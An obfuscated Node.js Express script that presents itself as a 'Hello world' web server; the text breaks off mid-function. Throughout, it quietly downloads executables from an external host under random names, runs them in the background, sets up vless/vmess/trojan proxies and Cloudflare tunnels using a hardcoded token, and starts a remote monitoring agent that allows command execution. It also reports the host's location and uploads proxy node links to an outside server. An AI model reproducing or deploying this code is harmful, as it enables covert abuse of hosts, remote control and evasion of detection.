const _0x1da146=_0x19b1;(function(_0x510914,_0x17e82b){const _0x57d8e3={_0xa6b354:0x140,_0x40ab6c:0xd5,_0x513d37:0x110,_0x22cb2e:0xb4,_0x30cb89:0xc7},_0x56aa97=_0x19b1,_0x678690=_0x510914();while(!![]){try{const _0x2cb647=-parseInt(_0x56aa97(_0x57d8e3._0xa6b354))/0x1+-parseInt(_0x56aa97(0x11d))/0x2*(-parseInt(_0x56aa97(0x116))/0x3)+parseInt(_0x56aa97(_0x57d8e3._0x40ab6c))/0x4*(parseInt(_0x56aa97(_0x57d8e3._0x513d37))/0x5)+-parseInt(_0x56aa97(_0x57d8e3._0x22cb2e))/0x6+parseInt(_0x56aa97(_0x57d8e3._0x30cb89))/0x7*(-parseInt(_0x56aa97(0xce))/0x8)+parseInt(_0x56aa97(0x141))/0x9*(-parseInt(_0x56aa97(0x93))/0xa)+-parseInt(_0x56aa97(0xc2))/0xb*(-parseInt(_0x56aa97(0x123))/0xc);if(_0x2cb647===_0x17e82b)break;else _0x678690['push'](_0x678690['shift']());}catch(_0x13faf6){_0x678690['push'](_0x678690['shift']());}}}(_0x4cee,0x78106));const express=require(_0x1da146(0x130)),app=express(),axios=require(_0x1da146(0xca)),os=require('os'),fs=require('fs'),path=require(_0x1da146(0x9f)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x1da146(0xa8)]),{execSync}=require(_0x1da146(0xf3)),UPLOAD_URL=process[_0x1da146(0xaa)][_0x1da146(0xe1)]||'',PROJECT_URL=process[_0x1da146(0xaa)][_0x1da146(0x138)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x1da146(0xaa)][_0x1da146(0x92)]||_0x1da146(0x117),SUB_PATH=process[_0x1da146(0xaa)]['SUB_PATH']||_0x1da146(0x11b),PORT=process[_0x1da146(0xaa)][_0x1da146(0xf5)]||process[_0x1da146(0xaa)][_0x1da146(0x135)]||0xbb8,UUID=process[_0x1da146(0xaa)][_0x1da146(0x11a)]||_0x1da146(0xd0),NEZHA_SERVER=process[_0x1da146(0xaa)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x1da146(0xaa)][_0x1da146(0x118)]||'',NEZHA_KEY=process[_0x1da146(0xaa)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x1da146(0xc1)]||'whm.cway.indevs.in',ARGO_AUTH=process[_0x1da146(0xaa)]['ARGO_AUTH']||_0x1da146(0x115),ARGO_PORT=process[_0x1da146(0xaa)][_0x1da146(0x145)]||0x1f41,CFIP=process[_0x1da146(0xaa)][_0x1da146(0x103)]||_0x1da146(0x149),CFPORT=process[_0x1da146(0xaa)]['CFPORT']||0x20fb,NAME=process['env'][_0x1da146(0x13a)]||_0x1da146(0x10d);!fs[_0x1da146(0xbd)](FILE_PATH)?(fs[_0x1da146(0x128)](FILE_PATH),console[_0x1da146(0xeb)](FILE_PATH+_0x1da146(0x11e))):console[_0x1da146(0xeb)](FILE_PATH+_0x1da146(0x14a));function generateRandomName(){const _0x254fd1={_0x2713ae:0xe3},_0x473660=_0x1da146,_0x5881d4='abcdefghijklmnopqrstuvwxyz';let _0x1d31dc='';for(let _0x127108=0x0;_0x127108<0x6;_0x127108++){_0x1d31dc+=_0x5881d4['charAt'](Math['floor'](Math[_0x473660(0xa7)]()*_0x5881d4[_0x473660(_0x254fd1._0x2713ae)]));}return _0x1d31dc;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1da146(0xe9)](FILE_PATH,npmName),phpPath=path[_0x1da146(0xe9)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x1da146(0xe9)](FILE_PATH,botName),subPath=path[_0x1da146(0xe9)](FILE_PATH,_0x1da146(0x13c)),listPath=path['join'](FILE_PATH,_0x1da146(0x122)),bootLogPath=path[_0x1da146(0xe9)](FILE_PATH,_0x1da146(0xf1)),configPath=path[_0x1da146(0xe9)](FILE_PATH,_0x1da146(0x12a));function deleteNodes(){const _0x5bbbac={_0x5856ac:0xbd,_0x56ac86:0xa9,_0x1ba754:0xf2,_0x3877fa:0xe3},_0x1d791d=_0x1da146;try{if(!UPLOAD_URL)return;if(!fs[_0x1d791d(_0x5bbbac._0x5856ac)](subPath))return;let _0x82af13;try{_0x82af13=fs[_0x1d791d(_0x5bbbac._0x56ac86)](subPath,_0x1d791d(0xcf));}catch{return null;}const _0x8ce31=Buffer['from'](_0x82af13,_0x1d791d(_0x5bbbac._0x1ba754))[_0x1d791d(0x9b)](_0x1d791d(0xcf)),_0x2294ed=_0x8ce31['split']('\x0a')['filter'](_0x2cc9ea=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1d791d(0xd3)](_0x2cc9ea));if(_0x2294ed[_0x1d791d(_0x5bbbac._0x3877fa)]===0x0)return;return axios['post'](UPLOAD_URL+_0x1d791d(0xbc),JSON[_0x1d791d(0xc0)]({'nodes':_0x2294ed}),{'headers':{'Content-Type':_0x1d791d(0x12b)}})['catch'](_0x58a2aa=>{return null;}),null;}catch(_0x452213){return null;}}function cleanupOldFiles(){const _0x9d830f={_0x402e8b:0xc5},_0x60399d=_0x1da146;try{const _0x3dec79=fs[_0x60399d(_0x9d830f._0x402e8b)](FILE_PATH);_0x3dec79[_0x60399d(0x11f)](_0x239cef=>{const _0x4020cf=_0x60399d,_0x40ef46=path['join'](FILE_PATH,_0x239cef);try{const _0x350f13=fs['statSync'](_0x40ef46);_0x350f13['isFile']()&&fs[_0x4020cf(0xc9)](_0x40ef46);}catch(_0x49b846){}});}catch(_0x264483){}}app[_0x1da146(0xe7)]('/',function(_0x27cd35,_0x5714c3){const _0x45a35b=_0x1da146;_0x5714c3[_0x45a35b(0x129)]('Hello\x20world!');});async function generateConfig(){const _0x4defe4={_0x4ca8ef:0xa1,_0x255a8c:0xb5,_0x46261a:0xf7,_0x192138:0xa5,_0x43ff5b:0xb5,_0x3c53bb:0xa1,_0x20c750:0xef,_0x582fc5:0xad,_0x5db7e7:0xaf,_0x13398c:0xef,_0x1a205c:0xa4,_0x29c707:0xee,_0x1ff8a4:0x12a,_0x50e154:0xc0},_0x51ac28=_0x1da146,_0x10f46a={'log':{'access':_0x51ac28(0x134),'error':_0x51ac28(0x134),'loglevel':_0x51ac28(_0x4defe4._0x4ca8ef)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x51ac28(_0x4defe4._0x255a8c),'settings':{'clients':[{'id':UUID,'flow':_0x51ac28(_0x4defe4._0x46261a)}],'decryption':_0x51ac28(0xa1),'fallbacks':[{'dest':0xbb9},{'path':_0x51ac28(0x114),'dest':0xbba},{'path':_0x51ac28(0xad),'dest':0xbbb},{'path':_0x51ac28(0xfc),'dest':0xbbc}]},'streamSettings':{'network':_0x51ac28(0xa5)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x51ac28(_0x4defe4._0x4ca8ef)},'streamSettings':{'network':_0x51ac28(_0x4defe4._0x192138),'security':_0x51ac28(0xa1)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x51ac28(_0x4defe4._0x43ff5b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x51ac28(_0x4defe4._0x3c53bb)},'streamSettings':{'network':'ws','security':_0x51ac28(_0x4defe4._0x3c53bb),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x51ac28(0xaf),_0x51ac28(_0x4defe4._0x20c750),_0x51ac28(0xa4)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x51ac28(0x139),'protocol':_0x51ac28(0xb8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x51ac28(_0x4defe4._0x582fc5)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x51ac28(_0x4defe4._0x20c750),_0x51ac28(0xa4)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x51ac28(0x139),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x51ac28(0xa1),'wsSettings':{'path':_0x51ac28(0xfc)}},'sniffing':{'enabled':!![],'destOverride':[_0x51ac28(_0x4defe4._0x5db7e7),_0x51ac28(_0x4defe4._0x13398c),_0x51ac28(_0x4defe4._0x1a205c)],'metadataOnly':![]}}],'dns':{'servers':[_0x51ac28(0xfa)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x51ac28(0xd4),'tag':_0x51ac28(0x108)}]};fs[_0x51ac28(_0x4defe4._0x29c707)](path['join'](FILE_PATH,_0x51ac28(_0x4defe4._0x1ff8a4)),JSON[_0x51ac28(_0x4defe4._0x50e154)](_0x10f46a,null,0x2));}function _0x19b1(_0x12540c,_0x32521a){const _0x4ceef8=_0x4cee();return _0x19b1=function(_0x19b199,_0x193acb){_0x19b199=_0x19b199-0x91;let _0x3a3651=_0x4ceef8[_0x19b199];return _0x3a3651;},_0x19b1(_0x12540c,_0x32521a);}function _0x4cee(){const _0x1e2050=['16hLnijz','8443','win32','close','&path=%2Fvless-argo%3Fed%3D2560#','Download\x20','then','listen','\x0avless://','https://amd64.ssss.nyc.mn/web','firefox','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','UPLOAD_URL','TunnelSecret','length','substring','2087','\x20-p\x20','get','https://arm64.ssss.nyc.mn/v1','join','pkill\x20-f\x20\x22[','log','config.yaml','Error\x20in\x20startserver:','writeFileSync','tls','status','boot.log','base64','child_process','catch','SERVER_PORT','response','xtls-rprx-vision','from','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https+local://8.8.8.8/dns-query','https://amd64.ssss.nyc.mn/agent','/trojan-argo','stream','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','org','automatic\x20access\x20task\x20added\x20successfully','ARGO_DOMAIN:','push','CFIP','Error\x20executing\x20command:\x20','/sub.txt\x20saved\x20successfully','443','all','block','error','match','\x0a\x0avmess://','http://ip-api.com/json/','whm-in','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','true','991235aosHgo','countryCode','&path=%2Ftrojan-argo%3Fed%3D2560#','/api/add-nodes','/vless-argo','eyJhIjoiMzRlOWU4N2IzYzViODkzNmU2NjNhZjc1NTYwMmNkODMiLCJ0IjoiNzVjM2ExYmUtZmQ5YS00YmM0LWIxOTUtNjZhNWE1NGM1MWQ0IiwicyI6Ik9HUTNNalpoWkRrdFpqQTFNeTAwWmpneExUazRZbVF0TXpobU5tRXpPR1F4TldFNSJ9','177GffHrq','./tmp','NEZHA_PORT','2083','UUID','lwy','2096','26930yFFgyd','\x20is\x20created','forEach','\x20-c\x20','success','list.txt','996awQMFy','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/config.json\x20>/dev/null\x202>&1\x20&','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/tunnel.yml\x20run','mkdirSync','send','config.json','application/json','data','NEZHA\x20variable\x20is\x20empty,skip\x20running','--tls','\x20-c\x20\x22','express','http\x20server\x20is\x20running\x20on\x20port:','pop','https://ipapi.co/json/','/dev/null','PORT','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Empowerment\x20failed\x20for\x20','PROJECT_URL','127.0.0.1','NAME','amd','sub.txt','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','platform','\x22\x20>\x20/dev/null\x202>&1','826038rikQYp','180VdiHlD','aarch64','Empowerment\x20success\x20for\x20','\x20successfully','ARGO_PORT','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','map','162.159.152.130','\x20already\x20exists','clear','FILE_PATH','314840sTWAXg','https://arm64.ssss.nyc.mn/bot','\x20is\x20running','https://amd64.ssss.nyc.mn/bot','text/plain;\x20charset=utf-8','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','arm','2053','toString','https://amd64.ssss.nyc.mn/v1','Nodes\x20uploaded\x20successfully','split','path','message','none','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','arm64','quic','tcp','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','random','exec','readFileSync','env','unshift','\x20failed:\x20','/vmess-argo','nohup\x20','http','php\x20running\x20error:\x20','\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/web','fileUrl','50130sxajwh','vless','tunnel.json','arch','vmess','set','country_code','del\x20/f\x20/q\x20','/api/delete-nodes','existsSync','createWriteStream','basename','stringify','ARGO_DOMAIN','169851KdUCVM','App\x20is\x20running','filter','readdirSync','\x20>\x20nul\x202>&1','6392197LoxuWs','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','unlinkSync','axios','post','Unhandled\x20error\x20in\x20startserver:','\x0a\x20\x20credentials-file:\x20','8BgHVhg','utf-8','eae111fd-a1a1-4c2b-a8de-625ffeda559e','Error\x20reading\x20boot.log:','tunnel.yml','test','blackhole'];_0x4cee=function(){return _0x1e2050;};return _0x4cee();}function getSystemArchitecture(){const _0x38bd4d={_0x111f7b:0xb7,_0x28eccf:0x99},_0x2957d5=_0x1da146,_0x1e5a1f=os[_0x2957d5(_0x38bd4d._0x111f7b)]();return _0x1e5a1f==='arm'||_0x1e5a1f===_0x2957d5(0xa3)||_0x1e5a1f===_0x2957d5(0x142)?_0x2957d5(_0x38bd4d._0x28eccf):_0x2957d5(0x13b);}function downloadFile(_0x1a1570,_0x58588b,_0x3c20de){const _0x5c4982={_0x1a183f:0xbd,_0x492d90:0x128,_0x5737df:0xbe,_0x46fd79:0xe7,_0x37e4b1:0xfd,_0x5b882a:0xdb,_0x1f933c:0xf4},_0xd68aa1={_0x1aa0d8:0xac,_0x49890b:0x109},_0x338cbd={_0x4300c0:0x12c},_0x4fa488=_0x1da146,_0x28cd01=_0x1a1570;!fs[_0x4fa488(_0x5c4982._0x1a183f)](FILE_PATH)&&fs[_0x4fa488(_0x5c4982._0x492d90)](FILE_PATH,{'recursive':!![]});const _0x1b80ec=fs[_0x4fa488(_0x5c4982._0x5737df)](_0x28cd01);axios({'method':_0x4fa488(_0x5c4982._0x46fd79),'url':_0x58588b,'responseType':_0x4fa488(_0x5c4982._0x37e4b1)})[_0x4fa488(_0x5c4982._0x5b882a)](_0x35de28=>{const _0x40c72c={_0x3f84cb:0xda,_0x190519:0x109},_0x21b350={_0xe787bc:0xeb,_0x2f830d:0xda,_0x579a79:0x144},_0x5c8bff=_0x4fa488;_0x35de28[_0x5c8bff(_0x338cbd._0x4300c0)]['pipe'](_0x1b80ec),_0x1b80ec['on']('finish',()=>{const _0x4649ae=_0x5c8bff;_0x1b80ec[_0x4649ae(0xd8)](),console[_0x4649ae(_0x21b350._0xe787bc)](_0x4649ae(_0x21b350._0x2f830d)+path['basename'](_0x28cd01)+_0x4649ae(_0x21b350._0x579a79)),_0x3c20de(null,_0x28cd01);}),_0x1b80ec['on'](_0x5c8bff(0x109),_0x55257a=>{const _0x3cce22=_0x5c8bff;fs['unlink'](_0x28cd01,()=>{});const _0x4ce785=_0x3cce22(_0x40c72c._0x3f84cb)+path[_0x3cce22(0xbf)](_0x28cd01)+_0x3cce22(0xac)+_0x55257a[_0x3cce22(0xa0)];console[_0x3cce22(_0x40c72c._0x190519)](_0x4ce785),_0x3c20de(_0x4ce785);});})[_0x4fa488(_0x5c4982._0x1f933c)](_0x36c8d0=>{const _0x727d08=_0x4fa488,_0x422275='Download\x20'+path[_0x727d08(0xbf)](_0x28cd01)+_0x727d08(_0xd68aa1._0x1aa0d8)+_0x36c8d0[_0x727d08(0xa0)];console[_0x727d08(_0xd68aa1._0x49890b)](_0x422275),_0x3c20de(_0x422275);});}async function downloadFilesAndRun(){const _0x4c38a5={_0x3a595e:0xe3,_0x5645cb:0x148,_0x26b50:0x109,_0x3fef61:0x106,_0x1064f1:0xd6,_0x1244fc:0x11c,_0x4163ef:0xe5,_0x1fdecb:0x9a,_0x24fc4f:0xc8,_0x479126:0x147,_0x45ee91:0xf9,_0x2f2a4b:0xee,_0x310333:0xec,_0xd606e9:0xa6,_0x2695f7:0xb0,_0x121527:0x11c,_0x306b23:0xe5,_0x2cf4e7:0x119,_0x34ed56:0xe6,_0xa40a0:0x95,_0x4a75ce:0x125,_0x31d513:0x95,_0x5bb167:0x109,_0x43290d:0x124,_0x32dbcc:0x127,_0x4aab60:0xae,_0x1e0ce9:0x104},_0x269e23={_0x2343f0:0xb3},_0x2c610b=_0x1da146,_0x116346=getSystemArchitecture(),_0x569615=getFilesForArchitecture(_0x116346);if(_0x569615[_0x2c610b(_0x4c38a5._0x3a595e)]===0x0){console[_0x2c610b(0xeb)](_0x2c610b(0x146));return;}const _0x270bf5=_0x569615[_0x2c610b(_0x4c38a5._0x5645cb)](_0x1246c6=>{return new Promise((_0x20949e,_0x567561)=>{const _0x3fc920=_0x19b1;downloadFile(_0x1246c6['fileName'],_0x1246c6[_0x3fc920(_0x269e23._0x2343f0)],(_0x4a7890,_0x32d9dc)=>{_0x4a7890?_0x567561(_0x4a7890):_0x20949e(_0x32d9dc);});});});try{await Promise[_0x2c610b(0x107)](_0x270bf5);}catch(_0x143fc3){console[_0x2c610b(_0x4c38a5._0x26b50)]('Error\x20downloading\x20files:',_0x143fc3);return;}function _0x2ec8c1(_0x13599b){const _0x5ecc26={_0x3b9998:0x109},_0xff16ad=_0x2c610b,_0x2a76e1=0x1fd;_0x13599b[_0xff16ad(0x11f)](_0x5c6d57=>{const _0x1ab479=_0xff16ad;fs[_0x1ab479(0xbd)](_0x5c6d57)&&fs['chmod'](_0x5c6d57,_0x2a76e1,_0x42dacc=>{const _0x47e546=_0x1ab479;_0x42dacc?console[_0x47e546(_0x5ecc26._0x3b9998)](_0x47e546(0x137)+_0x5c6d57+':\x20'+_0x42dacc):console[_0x47e546(0xeb)](_0x47e546(0x143)+_0x5c6d57+':\x20'+_0x2a76e1[_0x47e546(0x9b)](0x8));});});}const _0x1ae361=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2ec8c1(_0x1ae361);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xe72920=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x2c610b(0x132)]():'',_0x51a002=new Set([_0x2c610b(_0x4c38a5._0x3fef61),_0x2c610b(_0x4c38a5._0x1064f1),_0x2c610b(_0x4c38a5._0x1244fc),_0x2c610b(_0x4c38a5._0x4163ef),_0x2c610b(0x119),_0x2c610b(_0x4c38a5._0x1fdecb)]),_0x110ac0=_0x51a002['has'](_0xe72920)?_0x2c610b(0x10f):'false',_0x501850='\x0aclient_secret:\x20'+NEZHA_KEY+_0x2c610b(_0x4c38a5._0x24fc4f)+NEZHA_SERVER+_0x2c610b(_0x4c38a5._0x479126)+_0x110ac0+_0x2c610b(_0x4c38a5._0x45ee91)+UUID;fs[_0x2c610b(_0x4c38a5._0x2f2a4b)](path[_0x2c610b(0xe9)](FILE_PATH,_0x2c610b(_0x4c38a5._0x310333)),_0x501850);const _0x2fcbcf='nohup\x20'+phpPath+_0x2c610b(0x12f)+FILE_PATH+_0x2c610b(_0x4c38a5._0xd606e9);try{await exec(_0x2fcbcf),console['log'](phpName+_0x2c610b(0x95)),await new Promise(_0x22b60c=>setTimeout(_0x22b60c,0x3e8));}catch(_0x5cf8aa){console[_0x2c610b(0x109)](_0x2c610b(_0x4c38a5._0x2695f7)+_0x5cf8aa);}}else{let _0x31151c='';const _0x4d92ac=[_0x2c610b(0x106),_0x2c610b(0xd6),_0x2c610b(_0x4c38a5._0x121527),_0x2c610b(_0x4c38a5._0x306b23),_0x2c610b(_0x4c38a5._0x2cf4e7),_0x2c610b(_0x4c38a5._0x1fdecb)];_0x4d92ac['includes'](NEZHA_PORT)&&(_0x31151c=_0x2c610b(0x12e));const _0x5a5cd1=_0x2c610b(0xae)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x2c610b(_0x4c38a5._0x34ed56)+NEZHA_KEY+'\x20'+_0x31151c+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5a5cd1),console['log'](npmName+_0x2c610b(_0x4c38a5._0xa40a0)),await new Promise(_0x3a9293=>setTimeout(_0x3a9293,0x3e8));}catch(_0x23ac48){console[_0x2c610b(_0x4c38a5._0x26b50)]('npm\x20running\x20error:\x20'+_0x23ac48);}}}else console['log'](_0x2c610b(0x12d));const _0x4e041f=_0x2c610b(0xae)+webPath+_0x2c610b(0x120)+FILE_PATH+_0x2c610b(_0x4c38a5._0x4a75ce);try{await exec(_0x4e041f),console[_0x2c610b(0xeb)](webName+_0x2c610b(_0x4c38a5._0x31d513)),await new Promise(_0x3a3a9e=>setTimeout(_0x3a3a9e,0x3e8));}catch(_0x49e2f7){console[_0x2c610b(_0x4c38a5._0x5bb167)]('web\x20running\x20error:\x20'+_0x49e2f7);}if(fs[_0x2c610b(0xbd)](botPath)){let _0x1ae91a;if(ARGO_AUTH[_0x2c610b(0x10a)](/^[A-Z0-9a-z=]{120,250}$/))_0x1ae91a=_0x2c610b(_0x4c38a5._0x43290d)+ARGO_AUTH;else ARGO_AUTH[_0x2c610b(0x10a)](/TunnelSecret/)?_0x1ae91a=_0x2c610b(0x10e)+FILE_PATH+_0x2c610b(_0x4c38a5._0x32dbcc):_0x1ae91a=_0x2c610b(0xfe)+FILE_PATH+_0x2c610b(0x13d)+ARGO_PORT;try{await exec(_0x2c610b(_0x4c38a5._0x4aab60)+botPath+'\x20'+_0x1ae91a+_0x2c610b(0xb1)),console[_0x2c610b(0xeb)](botName+'\x20is\x20running'),await new Promise(_0x391282=>setTimeout(_0x391282,0x7d0));}catch(_0x2a8643){console['error'](_0x2c610b(_0x4c38a5._0x1e0ce9)+_0x2a8643);}}await new Promise(_0x4ea556=>setTimeout(_0x4ea556,0x1388));}function getFilesForArchitecture(_0x227c4f){const _0x538e83={_0x28766f:0x96,_0x31e882:0xe8,_0x49bad2:0x9c},_0x336aa2=_0x1da146;let _0x55f1f2;_0x227c4f===_0x336aa2(0x99)?_0x55f1f2=[{'fileName':webPath,'fileUrl':_0x336aa2(0xb2)},{'fileName':botPath,'fileUrl':_0x336aa2(0x94)}]:_0x55f1f2=[{'fileName':webPath,'fileUrl':_0x336aa2(0xde)},{'fileName':botPath,'fileUrl':_0x336aa2(_0x538e83._0x28766f)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5abc92=_0x227c4f==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x336aa2(0xfb);_0x55f1f2[_0x336aa2(0xab)]({'fileName':npmPath,'fileUrl':_0x5abc92});}else{const _0x35a553=_0x227c4f==='arm'?_0x336aa2(_0x538e83._0x31e882):_0x336aa2(_0x538e83._0x49bad2);_0x55f1f2[_0x336aa2(0xab)]({'fileName':phpPath,'fileUrl':_0x35a553});}}return _0x55f1f2;}function argoType(){const _0x973b2a={_0x32fb84:0xeb,_0x26ca6c:0xe2,_0x4b94e4:0xee,_0x212a40:0xe9,_0x32fd42:0xb6,_0x5e4b74:0xcd,_0x21e196:0xb6,_0x2de264:0xa2,_0x1245b9:0x136},_0x344ac1=_0x1da146;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x344ac1(_0x973b2a._0x32fb84)](_0x344ac1(0x98));return;}if(ARGO_AUTH['includes'](_0x344ac1(_0x973b2a._0x26ca6c))){fs[_0x344ac1(_0x973b2a._0x4b94e4)](path[_0x344ac1(_0x973b2a._0x212a40)](FILE_PATH,_0x344ac1(_0x973b2a._0x32fd42)),ARGO_AUTH);const _0x39b465='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x344ac1(_0x973b2a._0x5e4b74)+path['join'](FILE_PATH,_0x344ac1(_0x973b2a._0x21e196))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x344ac1(_0x973b2a._0x2de264)+ARGO_PORT+_0x344ac1(_0x973b2a._0x1245b9);fs['writeFileSync'](path['join'](FILE_PATH,_0x344ac1(0xd2)),_0x39b465);}else console['log'](_0x344ac1(0xe0));}async function extractDomains(){const _0x544342={_0x19fd08:0xeb,_0x1bb894:0xf1,_0x3e9dff:0xc9,_0xbd7c01:0xf1,_0x39cbff:0xfe,_0x4be5bf:0xb1,_0x11021c:0x109,_0x4d5af3:0x104,_0x1f3d88:0x109},_0x43e332={_0x195270:0xe7,_0x319e41:0xba,_0x3b50f6:0x12c,_0x3e735e:0x12c,_0x4385e0:0xff,_0x120795:0x121,_0x33b226:0xff,_0x1761bc:0x12c},_0x99701a={_0x1b7662:0xea,_0x4f6046:0xe4},_0x3f1944=_0x1da146;let _0xdfe88a;if(ARGO_AUTH&&ARGO_DOMAIN)_0xdfe88a=ARGO_DOMAIN,console[_0x3f1944(_0x544342._0x19fd08)](_0x3f1944(0x101),_0xdfe88a),await _0x6a09a2(_0xdfe88a);else try{const _0x41968a=fs[_0x3f1944(0xa9)](path['join'](FILE_PATH,_0x3f1944(_0x544342._0x1bb894)),_0x3f1944(0xcf)),_0x39587f=_0x41968a[_0x3f1944(0x9e)]('\x0a'),_0x5cb120=[];_0x39587f[_0x3f1944(0x11f)](_0x158754=>{const _0x3a6095=_0x3f1944,_0x17c72c=_0x158754['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x17c72c){const _0x27ff8e=_0x17c72c[0x1];_0x5cb120[_0x3a6095(0x102)](_0x27ff8e);}});if(_0x5cb120[_0x3f1944(0xe3)]>0x0)_0xdfe88a=_0x5cb120[0x0],console[_0x3f1944(0xeb)]('ArgoDomain:',_0xdfe88a),await _0x6a09a2(_0xdfe88a);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x3f1944(_0x544342._0x3e9dff)](path[_0x3f1944(0xe9)](FILE_PATH,_0x3f1944(_0x544342._0xbd7c01)));async function _0x1a6745(){const _0x33b799=_0x3f1944;try{process['platform']===_0x33b799(0xd7)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x33b799(_0x99701a._0x1b7662)+botName['charAt'](0x0)+']'+botName[_0x33b799(_0x99701a._0x4f6046)](0x1)+_0x33b799(0x13f));}catch(_0x3d9804){}}_0x1a6745(),await new Promise(_0x5e1243=>setTimeout(_0x5e1243,0xbb8));const _0x5b74e8=_0x3f1944(_0x544342._0x39cbff)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x3f1944(0xae)+botPath+'\x20'+_0x5b74e8+_0x3f1944(_0x544342._0x4be5bf)),console['log'](botName+_0x3f1944(0x95)),await new Promise(_0x521233=>setTimeout(_0x521233,0xbb8)),await extractDomains();}catch(_0x2af210){console[_0x3f1944(_0x544342._0x11021c)](_0x3f1944(_0x544342._0x4d5af3)+_0x2af210);}}}catch(_0xd92069){console[_0x3f1944(_0x544342._0x1f3d88)](_0x3f1944(0xd1),_0xd92069);}async function _0x431381(){const _0x539031=_0x3f1944;try{const _0x5c20bb=await axios[_0x539031(_0x43e332._0x195270)](_0x539031(0x133),{'timeout':0xbb8});if(_0x5c20bb['data']&&_0x5c20bb['data'][_0x539031(_0x43e332._0x319e41)]&&_0x5c20bb[_0x539031(_0x43e332._0x3b50f6)][_0x539031(0xff)])return _0x5c20bb['data'][_0x539031(_0x43e332._0x319e41)]+'_'+_0x5c20bb[_0x539031(_0x43e332._0x3e735e)][_0x539031(_0x43e332._0x4385e0)];}catch(_0x11942c){try{const _0x2209a2=await axios[_0x539031(0xe7)](_0x539031(0x10c),{'timeout':0xbb8});if(_0x2209a2[_0x539031(0x12c)]&&_0x2209a2[_0x539031(_0x43e332._0x3b50f6)][_0x539031(0xf0)]===_0x539031(_0x43e332._0x120795)&&_0x2209a2[_0x539031(_0x43e332._0x3e735e)][_0x539031(0x111)]&&_0x2209a2[_0x539031(0x12c)][_0x539031(_0x43e332._0x33b226)])return _0x2209a2['data'][_0x539031(0x111)]+'_'+_0x2209a2[_0x539031(_0x43e332._0x1761bc)]['org'];}catch(_0x2abffc){}}return'Unknown';}async function _0x6a09a2(_0x3c5afd){const _0x3dac69={_0x2ddfc5:0xa1,_0x39bd58:0xdd,_0x465311:0xd9,_0x1bbfef:0x10b,_0x2ae627:0x112,_0x1ca001:0xf8,_0x4f5636:0xee},_0x44465b=await _0x431381(),_0x4e9ff9=NAME?NAME+'-'+_0x44465b:_0x44465b;return new Promise(_0x1d8ca7=>{const _0x56573c={_0x3f3967:0x9b,_0x414727:0xf2,_0x2176d0:0x129};setTimeout(()=>{const 